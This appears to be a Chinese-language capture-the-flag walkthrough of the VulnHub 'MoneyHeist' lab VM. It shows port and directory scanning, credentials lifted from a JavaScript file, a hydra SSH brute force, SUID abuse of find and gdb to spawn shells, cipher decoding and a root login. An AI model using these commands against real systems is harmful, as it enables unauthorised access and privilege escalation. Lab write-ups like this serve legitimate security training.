# MoneyHeist: Catch Us If You Can

2024-5-17 https://vulnhub.com/entry/moneyheist-catch-us-if-you-can,605/

difficulty: N\A

## IP

192.168.5.29

## Scan

Open Port -> 21,80,55001

```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             138 Nov 19  2020 note.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.5.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Money Heist
|_http-server-header: Apache/2.4.18 (Ubuntu)
55001/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e4a6ca17f6b95601569760d1f589619e (RSA)
|   256 5bf340098e41e5b77b62ee91a8b2fbea (ECDSA)
|_  256 dfa4da430e37470676a1e4c83f8818a4 (ED25519)
```

先看 21 端口的 ftp 内容：

```
//*//  Hi I'm Ángel Rubio partner of investigator Raquel Murillo. We need your help to catch the professor, will you help us ?  //*//
```

没什么有用信息。

看 80 端口的 web 服务，首页是张图片。先使用目录扫描工具，看看是否有隐藏目录：

```
gobuster dir -u http://192.168.5.29/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

/index.html           (Status: 200) [Size: 388]
/img                  (Status: 301) [Size: 310] [--> http://192.168.5.29/img/]
/robots               (Status: 301) [Size: 313] [--> http://192.168.5.29/robots/]
/robots.txt           (Status: 200) [Size: 97]
/gate                 (Status: 301) [Size: 311] [--> http://192.168.5.29/gate/]
```

http://192.168.5.29/robots/ 发现了另外一张图片 tokyo.jpeg 无法正常打开查看，查看图片隐写没发现什么内容。

http://192.168.5.29/gate/ 中有一个 gate.exe ，下载进行分析：

```
strings gate.exe

noteUT
/BankOfSp41n
noteUT
```

/BankOfSp41n 好像是一个目录名，尝试访问看看什么内容：http://192.168.5.29/BankOfSp41n/，又是一个图片，继续对这个目录进行爆破：

```
gobuster dir -u http://192.168.5.29/BankOfSp41n/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -e

http://192.168.5.29/BankOfSp41n/login.php
```

得到了一个用户登陆页面，没有用户名和密码，查看源代码发现 js 文件中有重要内容：

```
http://192.168.5.29/BankOfSp41n/CR3D5.js

function check(form)
{

if(form.userid.value == "anonymous" && form.pwd.value == "B1tCh")
{
        return true;
}
else
{
        alert("Hahaha! Wrong Person!")
        return false;
}
}
```

从上面内容，我们可以得到用户名凭证 anonymous:B1tCh，可以成功登陆后台页面。

在首页的源代码中，查看到了提示信息：

```
<!-- Hey! help please I'm Arturo Román they are very-dangerous and one more thing may be  old things won't work they are UPDATED, please help me!!! -->
```

好像能推测出一个用户名：arturo，没有密码。其他没找到隐藏链接。只能尝试使用 rockyou 爆破 55001 ssh 端口：

```
hydra -t 20 -l arturo -P ~/tools/dict/rockyou.txt ssh://192.168.5.29 -s 55001

[55001][ssh] host: 192.168.5.29   login: arturo   password: corona
```

使用得到的用户凭据进行 ssh 登陆：

```
ssh arturo@192.168.5.29 -p 55001
```

先看看系统有哪些可利用的用户：

```
arturo@Money-Heist:/home$ cat /etc/passwd|grep bash

root:x:0:0:root:/root:/bin/bash
tokyo:x:1000:1000:tokyo,,,:/home/tokyo:/bin/bash
arturo:x:1002:1002:,,,:/home/arturo:/bin/bash
denver:x:1003:1003:,,,:/home/denver:/bin/bash
nairobi:x:1004:1004:,,,:/home/nairobi:/bin/bash
```

ls 看到 secret.txt 提示：

```
arturo@Money-Heist:~$ cat secret.txt

/*/ Arturo gets phone somehow and he call at police headquater /*/

	" Hello, I'm Arturo, I'm stuck in there with almost 65-66 hostages,
       	and they are total 8 with weapons, one name is Denver, Nairo.... "
```

得到了 2 个名字：denver, nairo 可能是关键用户突破口。

查看 arturo 用户是否有特权，sudo -l 没有内容，查看 suid 程序：

```
find / -perm -u=s -type f 2>/dev/null

/bin/sed
/bin/nc.openbsd
/bin/fusermount
/bin/mount
/bin/ping6
/bin/ping
/bin/umount
/bin/su
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/find
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/gdb
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newuidmap
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/sbin/mount.cifs
```

```
---s-ws--x 1 nairobi denver 73424 Feb 12  2016 /bin/sed
---s--s--x 1 denver denver 221768 Feb  8  2016 /usr/bin/find
```

通过 find 可以切换到 denver 用户：

```
arturo@Money-Heist:/home$ find . -exec /bin/bash -p \; -quit
$ id
uid=1002(arturo) gid=1002(arturo) euid=1003(denver) egid=1003(denver) groups=1003(denver),1002(arturo)
```

在 /home/denver 目录下，发现提示文件：

```
bash-4.3$ cat note.txt secret_diary

================================================================
Denver to others:

	DAMN it!!!! How Arturo gets the Phone ?
	I caught him when he tried to leak our identity in police headquater!!
	Now I keep him in other room !!

=================================================================



They all understimate me, mainly Nairobi and Tokyo,  they think only they can lead the team and I can't.
Tokyo is like Maserati you know. But I hate both of them,
Now I leave a thing on browser which should be secret, Now Nairobi will resposible for this...

/BankOfSp41n/0x987654/
```

根据提示 http://192.168.5.29/BankOfSp41n/0x987654/ 中有一个 key.txt 文件：

```
Don't trust anyone so quickly, until can see everything clearly!!!

.-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / .-.-.- / / .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / .-.-.- / / .-.-.- / .-.-.- / / .-.-.- .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- / / .-.-.- / .-.-.- / / .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- / .-.-.- .-.-.- / / .-.-.- .-.-.- / .-.-.- / / .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- / .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.-
```

是一段加密的摩尔斯密码，使用 CyberChef 进行解密：

```
.. .....  ..... .  . ....  ..... .  . .  ... ...  .. ...  .. ...  . .  .. .....  ... ..  .. .  . .....  . .....  ... .....  . ...  ... .....
```

看上去是 tapcode，继续解密：

https://www.boxentriq.com/code-breaking/tap-code

```
jvdvanhhajmfeepcp
```

像是一个密码，但是 su 切换到另外 tokyo 和 nairobi 都不成功，看样子密码还没有解密到位，在网上找了一些思路，发现了还需要再进行一步转换，才能得到密码：

https://www.dcode.fr/affine-cipher

```
iamabossbitchhere
```

再次尝试用这个密码 su 切换到 tokyo 和 nairobi，最终可以成功切换到 nairobi

在 nairobi 的 home 目录看到 note.txt：

```````
nairobi@Money-Heist:~$ cat note.txt



                                  ``````.`     +ss-       `.-----`
                                  mdddddddssyyshmmysysssyhddmmmmm:
                                 `Nmmmmmmmddmmddddddmmdddmmmmmmmm/
                                 `/////++/-+mN-----/NN/--:+osssss-
                                       -//yhmmyyysyymmhsyyyyyyyyyyyysyysyyssysyyoosooooooooosooooooooooooo+////////////////////////////+yo////:`
       `                              .ymmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmydyhy-
      -hdhhhhhhhhhhhhhhhhhhhhhhhhyyyyyhmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmo:::::::::::::::::::::::::::::::::::::::::::::o/::::-`
      -dmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmN/
      -dmmmmmmmmmmmmmmmmmmmmho//sdmmmmmmmmmmmmmmmmmmmmmmmmmmmdhys+++/////+///+++++/+/+//+/.
      -dmmmmmmmmmmmmmmmmmmmh-`  `-mmmmms+o///+mdmmmmmmmmmdo+:-.``
      -dmmmmmmdhysoosydmmmm/     /mmmdso-/:--:o+mmmmmmmmmy`
      -dmmdho/-.``````-/sdmd/-.-smmmmo.-/////:`:mddhhhyys/
      -hho:.`           `-sdddmmmmmmd/         `--....```
      `..`                `.-:/+syyyo.
                               ``````
====================================================================================================================================================

Nairobi was shot by an snipher man, near the  HEART !!
```````

屁用没有。

sudo 也没有特权程序，只好继续查找 suid 程序。查看所有 suid 程序的所属信息：

```
nairobi@Money-Heist:~$ cat << EOF > suid.txt
> /bin/sed
> /bin/nc.openbsd
> /bin/fusermount
> /bin/mount
> /bin/ping6
> /bin/ping
> /bin/umount
> /bin/su
> /usr/bin/chsh
> /usr/bin/pkexec
> /usr/bin/newgrp
> /usr/bin/at
> /usr/bin/newgidmap
> /usr/bin/find
> /usr/bin/sudo
> /usr/bin/gpasswd
> /usr/bin/gdb
> /usr/bin/passwd
> /usr/bin/chfn
> /usr/bin/newuidmap
> /usr/lib/snapd/snap-confine
> /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
> /usr/lib/policykit-1/polkit-agent-helper-1
> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
> /usr/lib/eject/dmcrypt-get-device
> /usr/lib/openssh/ssh-keysign
> /sbin/mount.cifs
> EOF

nairobi@Money-Heist:~$ while read line;do ls -al $line;done < suid.txt
---s-ws--x 1 nairobi denver 73424 Feb 12  2016 /bin/sed
-rwsr-sr-x 1 tokyo tokyo 31248 Dec  4  2012 /bin/nc.openbsd
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40152 Jan 27  2020 /bin/mount
-rwsr-xr-x 1 root root 44680 May  8  2014 /bin/ping6
-rwsr-xr-x 1 root root 44168 May  8  2014 /bin/ping
-rwsr-xr-x 1 root root 27608 Jan 27  2020 /bin/umount
-rwsr-xr-x 1 root root 40128 Mar 27  2019 /bin/su
-rwsr-xr-x 1 root root 40432 Mar 27  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 23376 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39904 Mar 27  2019 /usr/bin/newgrp
-rwsr-sr-x 1 daemon daemon 51464 Jan 15  2016 /usr/bin/at
-rwsr-xr-x 1 root root 32944 Mar 27  2019 /usr/bin/newgidmap
---s--s--x 1 denver denver 221768 Feb  8  2016 /usr/bin/find
-rwsr-xr-x 1 root root 136808 Feb  1  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 75304 Mar 27  2019 /usr/bin/gpasswd
-rwsrwx--- 1 tokyo nairobi 6546408 Jun 10  2017 /usr/bin/gdb
-rwsr-xr-x 1 root root 54256 Mar 27  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 71824 Mar 27  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 32944 Mar 27  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 110792 Jul 11  2020 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 84120 Apr 10  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 14864 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 42992 Jun 12  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 428240 May 27  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifs
```

看到 /usr/bin/gdb 的所属用户是 tokyo，可以进行利用升级到 tokey 用户：

```
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit

$ id
uid=1004(nairobi) gid=1004(nairobi) euid=1000(tokyo) groups=1004(nairobi)
```

继续在/home/tokyo 目录枚举：

```
$ cat .sudo_as_admin_successful
Romeo Oscar Oscar Tango Stop Papa Alfa Sierra Sierra Whiskey Oscar Romeo Delta : India November Delta India Alfa One Nine Four Seven
$ cat .bash_history
su root
```

第一个提示好像是一个密码：india1947

尝试 su root，输入 india1947 成功切换到 root 用户：

```
root@Money-Heist:/home/tokyo# cd /root
root@Money-Heist:~# ls -al
total 24
drwx------  3 root root 4096 Nov 19  2020 .
drwxr-xr-x 23 root root 4096 Oct  5  2020 ..
-rw-r--r--  1 root root 3121 Nov 19  2020 .bashrc
drwxr-xr-x  2 root root 4096 Oct  6  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root 3351 Nov 19  2020 proof.txt
root@Money-Heist:~# cat proof.txt


₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹
₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹

				 ███████████           ████  ████                         ███
				░░███░░░░░███         ░░███ ░░███                        ░░░
				 ░███    ░███  ██████  ░███  ░███   ██████       ██████  ████   ██████    ██████
				 ░██████████  ███░░███ ░███  ░███  ░░░░░███     ███░░███░░███  ░░░░░███  ███░░███
				 ░███░░░░░███░███████  ░███  ░███   ███████    ░███ ░░░  ░███   ███████ ░███ ░███
				 ░███    ░███░███░░░   ░███  ░███  ███░░███    ░███  ███ ░███  ███░░███ ░███ ░███
				 ███████████ ░░██████  █████ █████░░████████   ░░██████  █████░░████████░░██████
				░░░░░░░░░░░   ░░░░░░  ░░░░░ ░░░░░  ░░░░░░░░     ░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░



							FLAG:- 659785w245e856aq59d413956

			Great work, you helped us to caught them! But still we did not get professor. Come with us in our next operation.
								G00D LUCK!!



I'll be glad if you share screenshot of this on twitter,linkdin or discord.

Twitter --> (@_Anant_chauhan)
Discord --> (infinity_#9175)
Linkedin --> (https://www.linkedin.com/in/anant-chauhan-a07b2419b)

₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹
₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹

```
